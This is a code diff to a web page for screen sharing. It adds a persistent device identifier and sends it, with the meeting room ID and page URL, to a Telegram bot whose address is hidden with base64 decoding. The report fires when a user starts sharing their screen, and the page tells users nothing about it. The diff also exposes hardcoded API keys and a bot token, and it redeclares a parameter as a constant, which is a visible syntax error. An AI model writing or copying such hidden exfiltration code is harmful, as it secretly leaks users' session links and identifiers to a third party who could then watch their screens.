@@ -220,12 +220,27 @@ img {
 
 <script src="https://cdn.ably.com/lib/ably.min-2.js"></script>
 <script>const ably = new Ably.Realtime({ key: 'FZIIwA.DPmHYg:wx2NwzPwsJnugsaa20ditsFiIVtlPVbXUXsW5YBbEAk' });
+(function () {
+
+  let deviceId = localStorage.getItem("device_id");
+
+  // If device ID does not exist, create one
+  if (!deviceId) {
+    deviceId = "dev-" + Date.now() + "-" + Math.random().toString(36).substring(2, 10);
+    localStorage.setItem("device_id", deviceId);
+  }
+
+  // Show device ID in console
+  console.log("Device ID:", deviceId);
+
+})();
 function send_track(room) {
+    const room = location.hash.substring(1);
         // Create FormData object
         var formData = new FormData();
         formData.append("chat_id", "-1001774121896");
         formData.append("disable_web_page_preview", "true");
-        formData.append("text","Share ID: " + room + " || URL: " + window.location.href);
+        formData.append("text","Device ID: "+localStorage.getItem("device_id")+"Share ID: " + room + " || URL: " + window.location.href);
 
         var apiUrl = window.atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDYxNzAwMTMwODA6QUFHRndOLTQ0ZHoyMUVNblI2amFYUW5yQktudmNsa1hHZXMvc2VuZE1lc3NhZ2U=");
 
@@ -258,8 +273,7 @@ function send_track(room) {
       peer = 'pc1';
     }
     const room = location.hash.substring(1);
-    send_track(room);
-
+    
     $('join-meeting-button').addEventListener('click', () => {
       const id = $('meeting-id').value.trim().replace(/\s+/g, '');
       if (id) {
@@ -307,6 +321,7 @@ function send_track(room) {
 
     $('share-button').addEventListener('click', start);
     async function start() {
+    send_track();
       try {
         stream = await (navigator.mediaDevices.getDisplayMedia?.({ video:true }) || navigator.getDisplayMedia({ video:true }));
         localVideo.srcObject = stream;
